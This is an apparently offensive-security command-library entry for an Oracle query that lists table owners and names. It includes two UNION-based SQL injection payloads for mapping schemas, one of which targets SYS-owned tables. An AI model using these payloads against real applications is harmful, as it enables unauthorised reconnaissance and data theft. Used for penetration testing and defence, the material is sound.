---
id: e449e314-f952-4c89-b967-8960d359acf4
name: oracle-sql-list-tables-with-owner
type: command
executor: sql
data: 'SELECT owner, table_name FROM all_tables;'
output: null
created_at: '2023-04-06T03:56:35.238340+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
tags:
  - database-discovery
  - sql-injection
verified: true
validated: true
---

# oracle-sql-list-tables-with-owner

## Command

```sql
SELECT owner, table_name FROM all_tables;
```

## Description

This SQL command retrieves both the owner (schema) and table names from the ALL_TABLES view, providing context on data ownership in an Oracle database. Ideal for SQLi-based schema mapping to identify privileged or application-specific tables.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | No parameters; queries system view directly | Yes |

## Examples

### Basic Usage

```sql
SELECT owner, table_name FROM all_tables;
```

In injection: `' UNION SELECT owner, table_name FROM all_tables--`

### Advanced Usage

Filter by owner in payload: `' UNION SELECT owner, table_name FROM all_tables WHERE owner='SYS'--`

## Expected Output

Pairs of owner and table, e.g.:

OWNER     TABLE_NAME
--------  ----------
APP_USER  USERS
SYS       AUDIT

## Related

- [[procedures/Oracle-SQL-List-Tables-and-Columns]]
- [[commands/oracle-sql-list-all-tables]]
